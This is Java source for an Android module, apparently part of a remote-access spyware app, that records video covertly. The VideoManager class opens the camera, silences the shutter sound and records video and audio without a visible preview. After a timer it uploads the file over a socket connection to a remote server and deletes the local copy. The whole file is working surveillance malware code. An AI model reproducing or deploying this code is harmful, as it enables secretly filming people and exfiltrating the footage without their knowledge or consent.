package com.remote.app.Managers;

import android.content.Context;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import com.remote.app.IOSocket;
import com.remote.app.MainService;
import com.remote.app.TypeOpenFile;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class VideoManager {

    private Context context;
    static File videofile = null;
    private Camera camera;
    private MediaRecorder mMediaRecorder;
    static TimerTask stopRecording;
    private Integer cameraID;
    private Integer sec;
    private boolean Online;

    public VideoManager(Context context, int cameraID, final boolean Online, Integer sec) {
        try {
            this.context =context;
            this.cameraID =cameraID;
            this.Online =Online;
            this.sec =sec;

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void Start() {
            new MediaPrepareTask().execute(null, null, null);
    }

    public boolean startUp(){
        videofile =  MainService.OpenFile(TypeOpenFile.Video);

        try{
            releaseCamera();
            camera = Camera.open(cameraID);
        }catch (RuntimeException e){
            e.printStackTrace();
        }


        Camera.CameraInfo info = new Camera.CameraInfo();
        Camera.getCameraInfo(cameraID, info);

        Display display = ((WindowManager) MainService.getContextOfApplication().getSystemService(Context.WINDOW_SERVICE))
                .getDefaultDisplay();
        int rotation = display.getRotation();
        int degrees = 0;

        switch (rotation) {
            case Surface.ROTATION_0:
                degrees = 0;
                break; //Natural orientation
            case Surface.ROTATION_90:
                degrees = 90;
                break; //Landscape left
            case Surface.ROTATION_180:
                degrees = 180;
                break;//Upside down
            case Surface.ROTATION_270:
                degrees = 270;
                break;//Landscape right
            default:
                throw new IllegalStateException("Unexpected value: " + rotation);
        }

        if(info.canDisableShutterSound){
            try{
                camera.enableShutterSound(false);}
            catch (Exception e){}
        }


        int rotate = ( info.orientation - degrees + 360 ) % 360;

        Camera.Parameters parameters = camera.getParameters();

        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }

        parameters.setPictureSize(size.width, size.height);
        parameters.setRotation(rotate);


        camera.setParameters(parameters);
        try{
            camera.setPreviewTexture(new SurfaceTexture(0));
            //camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }

        mMediaRecorder = new MediaRecorder();

        camera.unlock();
        mMediaRecorder.setCamera(camera);

        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);

        mMediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));

        mMediaRecorder.setOutputFile(videofile.getPath());

        try {
            mMediaRecorder.prepare();
        } catch (IllegalStateException e) {
            releaseMediaRecorder();
            return false;
        } catch (IOException e) {
            releaseMediaRecorder();
            return false;
        }
        return true;
    }

    private void releaseMediaRecorder() {
        if (mMediaRecorder != null) {
            mMediaRecorder.reset();
            mMediaRecorder.release();
            mMediaRecorder = null;
            camera.lock();
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    class MediaPrepareTask extends AsyncTask<Void, Void, Boolean> {

        @Override
        protected Boolean doInBackground(Void... voids) {
            // initialize video camera
            if (startUp()) {
                mMediaRecorder.start();

                MainService.isRecording = true;

                stopRecording = new TimerTask() {
                    @Override
                    public void run() {
                        MainService.isRecording = false;
                        mMediaRecorder.stop();
                        if(Online)
                            sendVideo(videofile);
                        releaseMediaRecorder();
                        releaseCamera();
                    }
                };

                new Timer().schedule(stopRecording, sec*1000);
            } else {
                // prepare didn't work, release the camera
                releaseMediaRecorder();
                return false;
            }
            return true;
        }

        @Override
        protected void onPostExecute(Boolean result) {
        }
    }

    private void sendVideo(File file){
        int size = (int) file.length();
        byte[] data = new byte[size];

        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("image",false);
            object.put("video",true);
            object.put("name",file.getName());
            object.put("buffer" , data);
            try{
                IOSocket.getInstance().getIoSocket().emit("0xCA" , object);
                file.delete();
            }catch (Exception e){}
            buf.close();


        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }



}
